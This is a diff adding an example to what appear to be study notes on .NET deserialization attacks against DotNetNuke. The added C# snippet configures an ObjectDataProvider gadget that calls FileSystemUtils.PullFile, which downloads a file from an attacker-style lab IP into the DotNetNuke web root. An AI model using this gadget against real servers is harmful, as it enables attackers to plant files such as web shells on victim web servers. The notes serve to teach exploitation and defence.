@@ -142,4 +142,30 @@ Muñoz and Mirosh revealed four .NET deserialization gadgets useful for exploita
 
 Its power lies in allowing attackers to set the `MethodName` property to invoke any method on the wrapped object, while `MethodParameters` lets them pass arguments to that method. Importantly, since `MethodName` and `MethodParameters` are properties (not methods), `ObjectDataProvider` works within the serialization constraints of `XmlSerializer`. This makes it an ideal payload candidate for triggering arbitrary method calls during deserialization.
 
+- Example Use of the `ObjectDataProvider` Instance:
+  ```c#
+  using System;
+  using System.IO;
+  using System.Xml.Serialization;
+  using DotNetNuke.Common.Utilities;
+  using System.Windows.Data;
+  
+  namespace ODPSerializer
+  {
+      class Program
+      {
+          static void Main(string[] args)
+          {
+              ObjectDataProvider myODP = new ObjectDataProvider();
+              myODP.ObjectInstance = new FileSystemUtils();
+              myODP.MethodName = "PullFile";
+              myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
+              myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
+              Console.WriteLine("Done!");
+          }
+      }
+  }
+
+  ```
+
 **ObjectDataProvider Class Documentation:** https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=windowsdesktop-9.0
